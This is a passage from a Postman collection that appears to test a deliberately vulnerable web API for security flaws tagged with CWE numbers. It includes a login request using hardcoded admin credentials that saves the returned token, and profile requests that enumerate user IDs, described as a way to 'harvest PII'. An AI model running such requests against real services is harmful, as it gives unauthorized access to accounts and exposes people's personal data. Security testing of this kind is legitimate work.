    {
      "name": "Auth / IDOR",
      "item": [
        {
          "name": "Admin login - hardcoded creds (CWE-798)",
          "event": [
            {
              "listen": "test",
              "script": {
                "type": "text/javascript",
                "exec": [
                  "if (pm.response.code === 200) {",
                  "  const json = pm.response.json();",
                  "  if (json && json.token) {",
                  "    pm.collectionVariables.set('adminToken', json.token);",
                  "    console.log('Saved adminToken =', json.token);",
                  "  }",
                  "}"
                ]
              }
            }
          ],
          "request": {
            "method": "POST",
            "header": [
              { "key": "Content-Type", "value": "application/json" }
            ],
            "body": {
              "mode": "raw",
              "raw": "{\n  \"username\": \"admin\",\n  \"password\": \"admin123\"\n}"
            },
            "url": {
              "raw": "{{baseUrl}}/api/auth/admin-login",
              "host": ["{{baseUrl}}"],
              "path": ["api", "auth", "admin-login"]
            },
            "description": "Hardcoded credentials in source. Token is also predictable (username + UTC ticks)."
          }
        },
        {
          "name": "Profile - IDOR by ID (CWE-639)",
          "request": {
            "method": "GET",
            "header": [],
            "url": {
              "raw": "{{baseUrl}}/api/auth/profile/1",
              "host": ["{{baseUrl}}"],
              "path": ["api", "auth", "profile", "1"]
            }
          }
        },
        {
          "name": "Profile - enumerate other user (CWE-639)",
          "request": {
            "method": "GET",
            "header": [],
            "url": {
              "raw": "{{baseUrl}}/api/auth/profile/2",
              "host": ["{{baseUrl}}"],
              "path": ["api", "auth", "profile", "2"]
            },
            "description": "No authorization check. Iterate IDs to harvest PII."
          }
        }
